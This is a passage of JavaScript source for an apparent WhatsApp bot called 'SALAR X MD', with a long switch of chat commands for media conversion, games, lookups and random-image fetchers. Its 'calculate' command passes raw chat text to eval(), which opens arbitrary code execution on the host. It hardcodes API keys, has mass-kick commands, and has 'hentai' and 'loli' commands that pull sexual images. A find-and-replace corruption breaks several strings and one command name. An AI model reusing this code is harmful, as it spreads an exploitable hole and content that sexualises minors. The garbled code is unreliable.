                    exec(`ffmpeg -i ${inputPath} -c:v libx264 -pix_fmt yuv420p ${outputPath}`, async (err) => {
                        if (err) {
                            console.log(err);
                            return reply("❌ *Conversion failed*");
                        }

                        let converted = fs.readFileSync(outputPath);
                        await devtrust.sendMessage(m.chat,
                            addNewsletterContext({
                                video: converted,
                                mimetype: 'video/mp4',
                                caption: "🎬 *Converted to MP4*"
                            }),
                            { quoted: m }
                        );

                        try {
                            fs.unlinkSync(inputPath);
                            fs.unlinkSync(outputPath);
                        } catch (e) { }
                    });

                } catch (e) {
                    console.log(e);
                    reply("❌ *Conversion failed*");
                }
            }
                break;

            case 'tomp3': {
                if (!m.quoted) return reply("🎥 *Reply to a video* with tomp3");
                let mime = m.quoted.mimetype || '';
                if (!/video/.test(mime)) return reply("⚠️ *Reply to a video only*");

                try {
                    let media = await devtrust.downloadMediaMessage(m.quoted);

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            audio: media,
                            mimetype: 'audio/mpeg'
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.log(e);
                    reply("❌ *Conversion failed*");
                }
            }
                break;

            case 'kickadmins': {
                if (!m.isGroup) return reply(m.group);
                if (!isCreator && !isSudo)
                    return reply('🔒 *Owner/Sudo only*');

                let metadata = await devtrust.groupMetadata(m.chat).catch(() => null);
                let participants = metadata?.participants || [];
                let kicked = 0;

                for (let member of participants) {
                    if (member.id === botNumber) continue;
                    if (member.id === m.sender) continue;

                    if (member.admin === "superadmin" || member.admin === "admin") {
                        await devtrust.groupParticipantsUpdate(m.chat, [member.id], 'remove');
                        kicked++;
                        await sleep(1500);
                    }
                }

                reply(`✅ *${kicked} admins removed*`);
            }
                break;
                
                

            case 'kickall': {
                if (!m.isGroup) return reply(m.group);
                if (!isCreator && !isSudo)
                    return reply('🔒 *Owner/Sudo only*');

                let metadata = await devtrust.groupMetadata(m.chat).catch(() => null);
                let participants = metadata?.participants || [];
                let kicked = 0;

                for (let member of participants) {
                    if (member.id === botNumber) continue;
                    if (member.admin === "superadmin" || member.admin === "admin") continue;

                    await devtrust.groupParticipantsUpdate(m.chat, [member.id], 'remove');
                    kicked++;
                    await sleep(1500);
                }

                reply(`✅ *${kicked} members removed*`);
            }
                break;

            case 'coffee': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://coffee.alexflipnote.dev/random' },
                        caption: "☕ *Fresh coffee just for you*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'myip': {
                if (!isCreator) return reply("🔒 *Owner only*");

                try {
                    var http = require('http');
                    http.get({
                        'host': 'api.ipify.org',
                        'port': 80,
                        'path': '/'
                    }, function (resp) {
                        let ipData = '';
                        resp.on('data', function (chunk) {
                            ipData += chunk;
                        });
                        resp.on('end', function () {
                            reply(`🌐 *Your IP Address:*\n\`${ipData}\``);
                        });
                    }).on('error', function (e) {
                        reply(`❌ *Error fetching IP:* ${e.message}`);
                    });
                } catch (e) {
                    reply(`❌ *Error:* ${e.message}`);
                }
                break;
            }

            case "movie": {
                if (!text) return reply("🎬 *Example:* movie Inception");

                await devtrust.sendPresenceUpdate("composing", m.chat);

                try {
                    const res = await axios.get(`http://www.omdbapi.com/?t=${encodeURIComponent(text)}&apikey=6372bb60`);
                    if (res.data.Response === "False") return reply("❌ *Movie not found*");

                    const data = res.data;

                    let caption = `🎬 *${data.Title}*\n\n` +
                        `📅 ${data.Year} • ⭐ ${data.imdbRating}\n` +
                        `🎭 ${data.Genre}\n\n` +
                        `📝 ${data.Plot.substring(0, 200)}...\n\n` +
                        `👤 ${data.Director}`;

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: data.Poster !== "N/A" ? data.Poster : "https://i.ibb.co/rGr4bWW8/image1.jpg" },
                            caption: caption
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Movie info unavailable* • Try again later");
                }
            }
                break;

            case "sciencefact": {
                try {
                    const res = await axios.get("https://uselessfacts.jsph.pl/random.json?language=en");
                    reply(`🔬 *Science Fact*\n\n${res.data.text}`);
                } catch {
                    reply("❌ *Fact machine broke* • Try again later");
                }
            }
                break;

            case "book": {
                if (!text) return reply("📚 *Example:* book Harry Potter");

                try {
                    const res = await axios.get(`https://openlibrary.org/search.json?q=${encodeURIComponent(text)}&limit=3`);
                    if (!res.data.docs.length) return reply("❌ *No books found*");

                    const books = res.data.docs.map((b, i) =>
                        `${i + 1}. *${b.title}*\n👤 ${b.author_name?.[0] || "Unknown"}`
                    ).join("\n\n");

                    reply(`📚 *Book Search*\n\n${books}`);
                } catch {
                    reply("❌ *Search failed* • Library is closed");
                }
            }
                break;

            case "recipe": {
                if (!text) return reply("🍳 *Example:* recipe pancakes");

                try {
                    const res = await axios.get(`https://www.themealdb.com/api/json/v1/1/search.php?s=${encodeURIComponent(text)}`);
                    if (!res.data.meals) return reply("❌ *No recipes found*");

                    const meal = res.data.meals[0];
                    const ingredients = Array.from({ length: 20 })
                        .map((_, i) => meal[`strIngredient${i + 1}`] ? `• ${meal[`strIngredient${i + 1}`]} - ${meal[`strMeasure${i + 1}`]}` : '')
                        .filter(Boolean)
                        .join("\n");

                    const msg = `🍽 *${meal.strMeal}*\n\n${ingredients}`;
                    reply(msg);
                } catch {
                    reply("❌ *Recipe fetch failed* • Kitchen's closed");
                }
            }
                break;

            case "remind": {
                if (!text) return reply("⏰ *Usage:* remind 60 Take a break");

                const [sec, ...msgArr] = text.split(" ");
                const msgText = msgArr.join(" ");
                const delay = parseInt(sec) * 1000;

                if (isNaN(delay) || !msgText) return reply("❌ *Invalid format*");

                reply(`⏰ *Reminder set* for ${sec} seconds`);

                setTimeout(() => {
                    devtrust.sendMessage(m.chat, addNewsletterContext({ text: `⏰ *Reminder:* ${msgText}` }));
                }, delay);
            }
                break;

            case "define":
            case "dictionary": {
                if (!text) return reply("📖 *Example:* define computer");

                try {
                    const res = await axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${text}`);
                    const meanings = res.data[0].meanings[0].definitions[0].definition;
                    reply(`📖 *${text}*\n\n${meanings}`);
                } catch {
                    reply("❌ *Word not found*");
                }
            }
                break;

            case "currencies":
            case "currency": {
                if (!text) {
                    return reply(`💱 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Currency*\n\nUsage: ${prefix}currency [amount] [from] [to]\nExample: ${prefix}currency 100 USD EUR\n\nOr use: ${prefix}currencies to see all available codes`);
                }

                const [amount, from, to] = text.split(" ");

                // If all three arguments provided, do conversion
                if (amount && from && to) {
                    try {
                        await devtrust.sendMessage(m.chat, { react: { text: '💱', key: m.key } });

                        const response = await axios.get(`https://api.exchangerate.host/convert?from=${from.toUpperCase()}&to=${to.toUpperCase()}&amount=${amount}`, {
                            timeout: 10000
                        });

                        if (!response.data || !response.data.result) {
                            throw new Error('Invalid response');
                        }

                        reply(`💱 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Currency*\n\n${amount} ${from.toUpperCase()} = ${response.data.result} ${to.toUpperCase()}`);
                        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                    } catch (error) {
                        console.error('Currency error:', error.message);
                        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                        reply(`⚠️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Currency*\n\nExchange rates are sleeping. Try again later.`);
                    }
                    return;
                }

                // If no arguments or just "currencies", show available currencies
                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '💱', key: m.key } });

                    const response = await axios.get('https://apis.davidcyril.name.ng/tools/currencies', {
                        timeout: 10000
                    });

                    if (!response.data.success || !response.data.result) {
                        throw new Error('API Error');
                    }

                    let currencyList = `💱 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Currencies*\n\n`;

                    response.data.result.slice(0, 30).forEach((curr, i) => {
                        currencyList += `${i + 1}. *${curr.code}* - ${curr.name}\n`;
                    });

                    currencyList += `\n_Use ${prefix}currency [amount] [from] [to] to convert_`;

                    reply(currencyList);
                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (err) {
                    console.error('Currencies error:', err.message);
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                    reply(`⚠️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Currencies*\n\nCurrency list is on vacation. Try again later.`);
                }
            }
                break;

            case "genpass": {
                const length = parseInt(text) || 12;
                const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
                let pass = "";
                for (let i = 0; i < length; i++)
                    pass += chars.charAt(Math.floor(Math.random() * chars.length));

                reply(`🔑 *Generated Password*\n\n${pass}`);
            }
                break;

            case "readqr": {
                if (!m.quoted || !m.quoted.image)
                    return reply("📱 *Reply to a QR code image*");

                const buffer = await m.quoted.download();

                try {
                    const res = await axios.post("https://api.qrserver.com/v1/read-qr-code/", buffer, {
                        headers: { "Content-Type": "multipart/form-data" }
                    });
                    const qrText = res.data[0].symbol[0].data;
                    reply(`📱 *QR Code Content*\n\n${qrText}`);
                } catch (e) {
                    reply("❌ *Failed to read QR code*");
                }
            }
                break;

            case 'weather':
            case 'weather2':
            case 'weatherinfo': {
                if (!text) return reply(`🌤 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Weather*\n\nUsage: ${prefix}${command} [city]\nExample: ${prefix}${command} Lon𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗`);

                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '🌤️', key: m.key } });

                    reply(`🔍 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Weather*\n\nChecking forecast for ${text}...`);

                    const response = await axios.get(
                        `https://api.openweathermap.org/data/2.5/weather?q=${encodeURIComponent(text)}&units=metric&appid=d97e458517de3eac6d3c50abcdcbe0e7`,
                        { timeout: 10000 }
                    );

                    const data = response.data;

                    const weatherInfo = `📍 *${data.name}, ${data.sys.country}*\n` +
                        `🌡️ ${data.main.temp}°C (feels like ${data.main.feels_like}°C)\n` +
                        `☁️ ${data.weather[0].description}\n` +
                        `💧 ${data.main.humidity}% humidity\n` +
                        `🌬️ ${data.wind.speed} m/s wind`;

                    reply(`🌤 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Weather*\n\n${weatherInfo}`);
                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (error) {
                    console.error('Weather Error:', error.message);
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                    reply(`⚠️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Weather*\n\nWeather service is offline. Try again later.`);
                }
            }
                break;

            case "calculate": {
                if (!text) return reply("🧮 *Example:* calculate 12+25*3");

                try {
                    const result = eval(text);
                    reply(`🧮 *Result*\n\n${text} = ${result}`);
                } catch {
                    reply("❌ *Invalid expression*");
                }
            }
                break;

            case 'wiki':
            case 'wikipedia': {
                if (!text) {
                    return reply(`📚 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Wikipedia*\n\nUsage: ${prefix}${command} [search term]\nExample: ${prefix}${command} Albert Einstein`);
                }

                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '📚', key: m.key } });

                    reply(`🔍 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Wikipedia*\n\nSearching: ${text}`);

                    const response = await axios.get(
                        `https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(text)}`,
                        { timeout: 10000 }
                    );

                    const data = response.data;

                    // Handle disambiguation pages (multiple results)
                    if (data.type === 'disambiguation') {
                        return reply(`❌ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Wikipedia*\n\n"${text}" is too broad. Please be more specific.`);
                    }

                    // Check if extract exists
                    if (!data.extract) {
                        return reply(`❌ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Wikipedia*\n\nNo results found for "${text}". Try a different term.`);
                    }

                    // Truncate long extracts
                    const extract = data.extract.length > 500
                        ? data.extract.substring(0, 500) + '...'
                        : data.extract;

                    const info = `📚 *${data.title}*\n\n${extract}\n\n🔗 ${data.content_urls.desktop.page}`;

                    // Send with thumbnail if available
                    if (data.thumbnail) {
                        await devtrust.sendMessage(m.chat,
                            addNewsletterContext({
                                image: { url: data.thumbnail.source },
                                caption: info
                            }),
                            { quoted: m }
                        );
                    } else {
                        reply(`📚 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Wikipedia*\n\n${info}`);
                    }

                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (error) {
                    console.error('Wiki Error:', error.response?.data || error.message);
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });

                    if (error.response?.status === 404) {
                        return reply(`❌ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Wikipedia*\n\nPage "${text}" not found. Try another term.`);
                    }

                    reply(`⚠️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Wikipedia*\n\nWikipedia is taking a break. Try again later.`);
                }
            }
                break;

            // ============ HANGMAN GAME ============
            case "hangman": {
                const chatId = m.chat;
                const args = text?.split(" ") || [];
                let game = hangmanGames[chatId];

                // Start new game
                if (!game) {
                    if (!args[0]) return reply("🎮 *Start:* hangman banana");

                    const word = args[0].toLowerCase();
                    const display = "_".repeat(word.length).split("");
                    hangmanGames[chatId] = {
                        word,
                        display,
                        attempts: 6,
                        guessed: [],
                        wrongGuesses: 0
                    };

                    const visual = hangmanVisual[0]; // First visual (6 attempts left)

                    reply(`🎮 *Hangman Started*\n\n` +
                        `${visual}\n\n` +
                        `Word: ${display.join(" ")}\n` +
                        `Attempts: 6\n` +
                        `Guess: hangman [letter]`);
                    return;
                }

                // Make a guess
                if (!args[0]) return reply("🔤 *Guess a letter* • Example: hangman a");

                const letter = args[0].toLowerCase();
                if (letter.length !== 1) return reply("❌ *One letter at a time*");
                if (!/[a-z]/.test(letter)) return reply("❌ *Letters only*");
                if (game.guessed.includes(letter)) return reply("⚠️ *Already guessed*");

                game.guessed.push(letter);

                if (game.word.includes(letter)) {
                    // Correct guess
                    game.display = game.display.map((c, i) => (game.word[i] === letter ? letter : c));
                } else {
                    // Wrong guess
                    game.wrongGuesses += 1;
                    game.attempts -= 1;
                }

                // Get current hangman visual
                const visualIndex = Math.min(game.wrongGuesses, hangmanVisual.length - 1);
                const visual = hangmanVisual[visualIndex];

                // Check win condition
                if (!game.display.includes("_")) {
                    reply(`🎉 *You won!*\n\nWord: ${game.word}\n\n${visual}`);
                    delete hangmanGames[chatId];
                    return;
                }

                // Check lose condition
                if (game.attempts <= 0) {
                    reply(`💀 *Game over!*\n\nWord: ${game.word}\n\n${visual}`);
                    delete hangmanGames[chatId];
                    return;
                }

                // Game continues
                reply(`🎮 *Hangman*\n\n` +
                    `${visual}\n\n` +
                    `Word: ${game.display.join(" ")}\n` +
                    `Attempts: ${game.attempts}\n` +
                    `Guessed: ${game.guessed.join(", ")}`);
            }
                break;
            // ======================================

            case "numbattle": {
                const userRoll = Math.floor(Math.random() * 100) + 1;
                const botRoll = Math.floor(Math.random() * 100) + 1;

                let result = userRoll > botRoll ? "🎉 *You win!*" :
                    userRoll < botRoll ? "😢 *You lose!*" : "🤝 *It's a tie!*";

                reply(`🎲 *Number Battle*\n\nYou: ${userRoll}\nBot: ${botRoll}\n\n${result}`);
            }
                break;

            case "coinbattle": {
                const userFlip = Math.random() < 0.5 ? "Heads" : "Tails";
                const botFlip = Math.random() < 0.5 ? "Heads" : "Tails";

                let result = userFlip === botFlip ? "🎉 *You win!*" : "😢 *You lose!*";

                reply(`🪙 *Coin Battle*\n\nYou: ${userFlip}\nBot: ${botFlip}\n\n${result}`);
            }
                break;

            case "numberbattle": {
                if (!text) return reply("🎯 *Usage:* numberbattle 25");

                const number = Math.floor(Math.random() * 50) + 1;
                const guess = parseInt(text);

                let result = guess === number ? "🎉 *Perfect guess!*" :
                    guess > number ? "⬇️ *Too high!*" : "⬆️ *Too low!*";

                reply(`🎯 *Number Battle*\n\nYour guess: ${guess}\nTarget: ${number}\n\n${result}`);
            }
                break;

            case "math": {
                const a = Math.floor(Math.random() * 50) + 1;
                const b = Math.floor(Math.random() * 50) + 1;

                reply(`➕ *Math Quiz*\n\n${a} + ${b} = ?\nReply: mathanswer number`);
            }
                break;

            case "emojiquiz": {
                const quizzes = [
                    { emoji: "🐍", answer: "snake" },
                    { emoji: "🍎", answer: "apple" },
                    { emoji: "🏎️", answer: "car" },
                    { emoji: "🎸", answer: "guitar" },
                    { emoji: "☕", answer: "coffee" }
                ];

                const quiz = quizzes[Math.floor(Math.random() * quizzes.length)];
                reply(`🧩 *Emoji Quiz*\n\n${quiz.emoji}\nReply: emojianswer your guess`);
            }
                break;

            case "dice": {
                const roll = Math.floor(Math.random() * 6) + 1;
                reply(`🎲 *You rolled a ${roll}!*`);
            }
                break;

            case "rpsls": {
                if (!text) return reply("🪨 *Choose:* rock, paper, scissors, lizard, spock");

                const choices = ["rock", "paper", "scissors", "lizard", "spock"];
                const userChoice = text.toLowerCase();

                if (!choices.includes(userChoice))
                    return reply("❌ *Invalid choice* • Use rock, paper, scissors, lizard, spock");

                const botChoice = choices[Math.floor(Math.random() * choices.length)];

                const winMap = {
                    rock: ["scissors", "lizard"],
                    paper: ["rock", "spock"],
                    scissors: ["paper", "lizard"],
                    lizard: ["spock", "paper"],
                    spock: ["scissors", "rock"]
                };

                let result = userChoice === botChoice ? "🤝 *It's a tie!*" :
                    winMap[userChoice].includes(botChoice) ? "🎉 *You win!*" : "😢 *You lose!*";

                reply(`🪨 *RPSLS*\n\nYou: ${userChoice}\nBot: ${botChoice}\n\n${result}`);
            }
                break;
            case "coin": {
                const result = Math.random() < 0.5 ? "🪙 Heads" : "🪙 Tails";
                await devtrust.sendMessage(m.chat, addNewsletterContext({ text: `🎲 Coin Flip Result: ${result}` }), { quoted: m });
            }
                break;
            case "gamefact": {
                try {
                    const res = await axios.get("https://www.freetogame.com/api/games");
                    const games = res.data;
                    const game = games[Math.floor(Math.random() * games.length)];

                    reply(`🎮 *${game.title}*\n🎭 ${game.genre}\n📱 ${game.platform}\n🔗 ${game.game_url}`);
                } catch (e) {
                    console.error("GAMEFACT ERROR:", e);
                    reply("❌ *Game fact unavailable* • Server offline");
                }
            }
                break;

            case "fox": {
                try {
                    const res = await axios.get("https://randomfox.ca/floof/");
                    const img = res.data?.image;
                    if (!img) return reply("❌ *Fox ran away* • Try again");

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: img },
                            caption: "🦊 *Random Fox*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error("FOX ERROR:", e);
                    reply("❌ *Fox hunt failed* • API is sleeping");
                }
            }
                break;
                

            case "bchcn": {
                try {
                    const res = await axios.get("https://some-random-api.ml/img/koala");
                    const img = res.data?.link;
                    if (!img) return reply("❌ *Koala hiding* • Try again");

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: img },
                            caption: "🐨 *Random Koala*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error("KOALA ERROR:", e);
                    reply("❌ *Koala fetch failed* • Eucalyptus shortage");
                }
            }
                break;

            case "hxjxjjkm": {
                try {
                    const res = await axios.get("https://some-random-api.ml/img/birb");
                    const img = res.data?.link;
                    if (!img) return reply("❌ *Bird flew away* • Try again");

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: img },
                            caption: "🐦 *Random Bird*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error("BIRD ERROR:", e);
                    reply("❌ *Bird migration failed* • Try later");
                }
            }
                break;

            case "panda": {
                try {
                    const res = await axios.get("https://some-random-api.ml/img/panda");
                    const img = res.data?.link;

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: img },
                            caption: "🐼 *Random Panda*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error("PANDA ERROR:", e);
                    reply("❌ *Panda on vacation* • Try again");
                }
            }
                break;

            case "funfact": {
                try {
                    const res = await axios.get("https://uselessfacts.jsph.pl/random.json?language=en");
                    const fact = res.data?.text || "Bots are awesome!";
                    reply(`💡 *Fun Fact*\n\n${fact}`);
                } catch (e) {
                    console.error("FUNFACT ERROR:", e);
                    reply("❌ *Fact machine broke* • Try again later");
                }
            }
                break;

            case "vkfkk": {
                try {
                    const res = await axios.get("https://api.quotable.io/random");
                    const quote = res.data?.content || "Keep pushing forward!";
                    const author = res.data?.author || "Unknown";
                    reply(`🖋 *"${quote}"*\n— ${author}`);
                } catch (e) {
                    console.error("QUOTEMEME ERROR:", e);
                    reply("❌ *Quote generator is silent* • Try later");
                }
            }
                break;

            case "prog": {
                try {
                    const res = await axios.get("https://v2.jokeapi.dev/joke/Programming?type=single");
                    const joke = res.data?.joke || "Why do programmers prefer dark mode? Light attracts bugs!";
                    reply(`💻 *Programming Joke*\n\n${joke}`);
                } catch (e) {
                    console.error("PROG JOKE ERROR:", e);
                    reply("❌ *Joke compiler error* • Try again");
                }
            }
                break;

            case "dadjoke": {
                try {
                    const res = await axios.get("https://icanhazdadjoke.com/", { headers: { Accept: "application/json" } });
                    const joke = res.data?.joke || "I'm still working on it!";
                    reply(`👴 *Dad Joke*\n\n${joke}`);
                } catch (e) {
                    console.error("DAD JOKE ERROR:", e);
                    reply("❌ *Dad left for milk* • Try later");
                }
            }
                break;

            case "progquote": {
                try {
                    const res = await axios.get("https://hdramming-quotes-api.herokuapp.com/quotes/random");
                    const quote = res.data?.en || "Talk is cheap. Show me the code.";
                    const author = res.data?.author || "Linus Torvalds";
                    reply(`💻 *"${quote}"*\n— ${author}`);
                } catch (e) {
                    console.error("PROGQUOTE ERROR:", e);
                    reply("❌ *Quote not found* • 404 error");
                }
            }
                break;

            case "asciivjxnd": {
                if (!text) return reply("✏️ *Example:* ascii Hello");

                try {
                    const res = await axios.get(`https://artii.herokuapp.com/make?text=${encodeURIComponent(text)}`);
                    const ascii = res.data || text;
                    reply(`🎨 *ASCII Art*\n\n\`\`\`${ascii}\`\`\``);
                } catch (e) {
                    console.error("ASCII ERROR:", e);
                    reply("❌ *ASCII generator failed*");
                }
            }
                break;

            case "guess": {
                const number = Math.floor(Math.random() * 10) + 1;
                if (!text) return reply("🎲 *Usage:* guess 7");

                const guess = parseInt(text);
                if (isNaN(guess) || guess < 1 || guess > 10)
                    return reply("❌ *Choose 1-10*");

                const result = guess === number ? "🎉 *Correct!*" : "😢 *Wrong guess*";
                reply(`🎯 *Guess Game*\n\nYou: ${guess}\nBot: ${number}\n${result}`);
            }
                break;

            case "moviequote": {
                try {
                    const res = await axios.get("https://movie-quote-api.herokuapp.com/v1/quote/");
                    const quote = res.data?.quote || "May the Force be with you.";
                    const movie = res.data?.show || "Unknown";
                    reply(`🎬 *"${quote}"*\n— ${movie}`);
                } catch (e) {
                    console.error("MOVIE QUOTE ERROR:", e);
                    reply("❌ *Movie quote unavailable* • Cinema closed");
                }
            }
                break;

            case "triviafact": {
                try {
                    const res = await axios.get("https://uselessfacts.jsph.pl/random.json?language=en");
                    const fact = res.data?.text || "You're awesome!";
                    reply(`🧠 *Trivia Fact*\n\n${fact}`);
                } catch (e) {
                    console.error("TRIVIA FACT ERROR:", e);
                    reply("❌ *Trivia machine broke*");
                }
            }
                break;

            case "cbhcchhcx": {
                try {
                    const res = await axios.get("https://type.fit/api/quotes");
                    const quotes = res.data;
                    const q = quotes[Math.floor(Math.random() * quotes.length)];
                    reply(`🌟 *"${q.text}"*\n— ${q.author || "Unknown"}`);
                } catch (e) {
                    console.error("INSPIRE ERROR:", e);
                    reply("❌ *Inspiration unavailable*");
                }
            }
                break;

            case "compliment": {
                try {
                    const res = await axios.get("https://complimentr.com/api");
                    const compliment = res.data?.compliment || "You are awesome!";
                    reply(`💖 *${compliment}*`);
                } catch (e) {
                    console.error("COMPLIMENT ERROR:", e);
                    reply("❌ *Compliment machine is shy* • Try later");
                }
            }
                break;

            case "dog": {
                try {
                    const res = await axios.get("https://dog.ceo/api/breeds/image/random");
                    const img = res.data?.message;
                    if (!img) return reply("❌ *Dog ran away*");

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: img },
                            caption: "🐶 *Random Dog*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error("DOG ERROR:", e);
                    reply("❌ *Dog fetch failed* • On a walk");
                }
            }
                break;

            case 'sfw': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/sfw' },
                        caption: "✨ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 SFW*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'moe': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/moe' },
                        caption: "🌸 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Moe*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'aipic': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/aipic' },
                        caption: "🤖 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 AI Pic*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'hentai': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/hentai' },
                        caption: "🔞 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'chinagirl': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/chinagirl' },
                        caption: "🇵🇰 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 China Girl*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'bluearchive': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/bluearchive' },
                        caption: "📘 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Blue Archive*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'boypic': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/boypic' },
                        caption: "👦 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Boy Pic*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'carimage': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/carimage' },
                        caption: "🏎️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Car*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'random-girl': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/randomgirl' },
                        caption: "👧 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Random Girl*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'hijab-girl': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/hijabgirl' },
                        caption: "🧕 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Hijab Girl*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'in𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗esia-girl': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/in𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗esiagirl' },
                        caption: "🇮🇩 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 In𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗esia Girl*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'japan-girl': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/japangirl' },
                        caption: "🇯🇵 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Japan Girl*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'korean-girl': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/koreangirl' },
                        caption: "🇰🇷 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Korean Girl*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'loli': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/loli' },
                        caption: "🎀 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'malaysia-girl': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/malaysiagirl' },
                        caption: "🇲🇾 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Malaysia Girl*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'profile-pictures': {
                devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/profilepictures' },
                        caption: "🖼️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Profile Pics*"
                    }),
